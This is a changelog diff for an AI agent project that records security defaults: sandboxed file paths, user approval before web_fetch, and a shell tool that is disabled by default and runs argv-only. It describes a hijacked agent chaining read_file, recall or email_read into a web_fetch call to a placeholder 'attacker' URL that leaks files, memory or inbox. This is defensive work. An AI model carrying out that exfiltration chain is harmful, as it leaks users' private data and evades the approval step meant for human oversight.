@@ -64,6 +64,12 @@ The initial set of shipped capabilities for "Your free, private, 24/7 intern" �
   resolves (via `realpath`, so `..`/symlinks can't escape) outside the agent's working dir —
   closing a local-file-inclusion path that could otherwise be chained with `web_fetch` to
   exfiltrate arbitrary files.
+- **`web_fetch` is gated `ask_first` by default (anti-exfiltration)** (`agent/tools.py`,
+  `agent/cli.py`) — a fetched URL is an egress channel, so a hijacked model can no longer chain
+  `read_file`/`recall`/`email_read` → `web_fetch("http://attacker/?leak=…")` to leak your files,
+  memory, or inbox without an approval that shows you the URL. Opt into hands-free web research
+  with `tools.web_fetch.autonomous: true`. (`verify_website` stays autonomous — it can't be fed a
+  model-chosen URL.)
 - **`run_shell` ships disabled** (`agent/tools.py`, `agent/cli.py`) — the shell tool is opt-in via
   `tools.run_shell.enabled: true`; by default the agent has no command-execution tool. When
   enabled it runs an **argv list (no `shell=True`)**, so shell metacharacters can't chain a second
